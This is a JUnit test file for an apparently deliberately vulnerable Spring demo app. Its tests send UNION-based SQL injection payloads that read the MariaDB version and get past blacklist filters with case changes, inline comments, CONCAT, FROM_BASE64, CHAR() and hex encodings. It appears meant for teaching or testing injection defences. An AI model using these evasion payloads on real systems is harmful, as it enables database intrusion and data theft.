package tld.victim.webapp_java_spring;

import org.junit.After;
import org.junit.Before;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.web.servlet.MockMvc;

@SpringBootTest
@AutoConfigureMockMvc
class WebappJavaSpringApplicationTests {

	private SQLiDemoTestBuilder sqLiDemoTestBuilder;

	@Autowired
	private MockMvc mockMvc;

	@Before
	public void init() throws Exception
	{
		new SQLiDemoTestBuilder(mockMvc).
				post().
				endpoint("/sqlidemo/add").
				data("username", "testuser").
				data("password","password").
				resultContains("Saved").
				run();
	}

	@Test
	public void testDefaultSQLi() throws Exception {

		new SQLiDemoTestBuilder(mockMvc).
				post().
				endpoint("/sqlidemo/vulnbyid").
				data("id", "1%27+UNION+SELECT+NULL%2CNULL%2C%28SELECT+%40%40VERSION%29+--+").
				data("password","password").
				resultContains("10.3").
				resultContains("MariaDB").
				resultContains("ubuntu").
				run();

	}

	@Test
	public void testCircumventOddQuotesAdd() throws Exception {

		new SQLiDemoTestBuilder(mockMvc).
				post().
				endpoint("/sqlidemo/vulnbyid").
				data("id", "1\\' UNION SELECT NULL,NULL,(@@VERSION) --+").
				data("blacklistconfig","add_oddsinglequotes").
				resultContains("10.3").
				resultContains("MariaDB").
				resultContains("ubuntu").
				run();

		new SQLiDemoTestBuilder(mockMvc).
				post().
				endpoint("/sqlidemo/vulnbyid").
				data("id", "1' union select null,null,(@@version) as username from user where id='1").
				data("blacklistconfig","add_oddsinglequotes").
				resultContains("10.3").
				resultContains("MariaDB").
				resultContains("ubuntu").
				run();
	}

	@Test
	public void testCircumventAnyUpperCaseBlock() throws Exception {

		new SQLiDemoTestBuilder(mockMvc).
				post().
				endpoint("/sqlidemo/vulnbyid").
				data("id", "1' union select null,null,(@@version) --+").
				data("blacklistconfig","block_anyuppercase").
				resultContains("10.3").
				resultContains("MariaDB").
				resultContains("ubuntu").
				run();
	}

	@Test
	public void testCircumventAnyLowerCaseBlock() throws Exception {

		new SQLiDemoTestBuilder(mockMvc).
				post().
				endpoint("/sqlidemo/vulnbyid").
				data("id", "1' UNION SELECT NULL,NULL,(@@VERSION) --+").
				data("blacklistconfig","block_anylowercase").
				resultContains("10.3").
				resultContains("MariaDB").
				resultContains("ubuntu").
				run();
	}

	@Test
	public void testCircumventKeywordSequenceBlock() throws Exception {

		new SQLiDemoTestBuilder(mockMvc).
				post().
				endpoint("/sqlidemo/vulnbyid").
				data("id", "1' union/**/select null,null,(@@version) --+").
				data("blacklistconfig","block_keywordsequences").
				resultContains("10.3").
				resultContains("MariaDB").
				resultContains("ubuntu").
				run();
	}

	@Test
	public void testCircumventStringsBlock_1() throws Exception {

		new SQLiDemoTestBuilder(mockMvc).
				post().
				endpoint("/sqlidemo/vulnbyid").
				data("id", "1' union select null,null,(select variable_value from information_schema.global_variables where variable_name=CONCAT('VERSIO','N')) --+").
				data("blacklistconfig","block_badstrings").
				resultContains("10.3").
				resultContains("MariaDB").
				resultContains("ubuntu").
				run();
	}

	@Test
	public void testCircumventStringsBlock_2() throws Exception {

		new SQLiDemoTestBuilder(mockMvc).
				post().
				endpoint("/sqlidemo/vulnbyid").
				data("id", "1' union select null,null,(select variable_value from information_schema.global_variables where variable_name=FROM_BASE64('VkVSU0lPTg==')) --+").
				data("blacklistconfig","block_badstrings,block_concatenation").
				resultContains("10.3").
				resultContains("MariaDB").
				resultContains("ubuntu").
				run();
	}

	@Test
	public void testCircumventStringsBlock_3() throws Exception {

		new SQLiDemoTestBuilder(mockMvc).
				post().
				endpoint("/sqlidemo/vulnbyid").
				data("id", "1' union select null,null,(select variable_value from information_schema.global_variables where variable_name=CHAR(86,69,82,83,73,79,78)) --+").
				data("blacklistconfig","block_badstrings,block_concatenation,block_base64").
				resultContains("10.3").
				resultContains("MariaDB").
				resultContains("ubuntu").
				run();
	}

	@Test
	public void testCircumventStringsBlock_4() throws Exception {

		new SQLiDemoTestBuilder(mockMvc).
				post().
				endpoint("/sqlidemo/vulnbyid").
				data("id", "1' union select null,null,(select variable_value from information_schema.global_variables where variable_name=0x56455253494F4E) --+").
				data("blacklistconfig","block_badstrings,block_concatenation,block_base64,block_char_function").
				resultContains("10.3").
				resultContains("MariaDB").
				resultContains("ubuntu").
				run();
	}

	@Test
	public void testCircumventDoubleDashBlock() throws Exception {

		new SQLiDemoTestBuilder(mockMvc).
				post().
				endpoint("/sqlidemo/vulnbyid").
				data("id", "1' union select null,null,(@@version) #").
				data("blacklistconfig","block_comment_doubledash").
				resultContains("10.3").
				resultContains("MariaDB").
				resultContains("ubuntu").
				run();
	}

	@Test
	public void testCircumventCommentsBlock() throws Exception {

		new SQLiDemoTestBuilder(mockMvc).
				post().
				endpoint("/sqlidemo/vulnbyid").
				data("id", "1' union select null,null,(@@version) as username from user where id='1").
				data("blacklistconfig","block_comment_doubledash,block_comment_hash").
				resultContains("10.3").
				resultContains("MariaDB").
				resultContains("ubuntu").
				run();
	}

	@Test
	public void testMostOfBlacklist() throws Exception {

		new SQLiDemoTestBuilder(mockMvc).
				post().
				endpoint("/sqlidemo/vulnbyid").
				data("id", "1' union select null,null,(select variable_value from information_schema.global_variables where variable_name=0x56455253494F4E) as username from user where id='1").
				data("blacklistconfig","block_badstrings,block_concatenation,block_base64,block_char_function,block_comment_doubledash,block_comment_hash").
				resultContains("10.3").
				resultContains("MariaDB").
				resultContains("ubuntu").
				run();
	}

	@After
	public void teardown() throws Exception
	{
		new SQLiDemoTestBuilder(mockMvc).
				delete().
				endpoint("/sqlidemo/del").
				data("username", "testuser").
				data("password","password").
				resultContains("Deleted").
				run();
	}

}
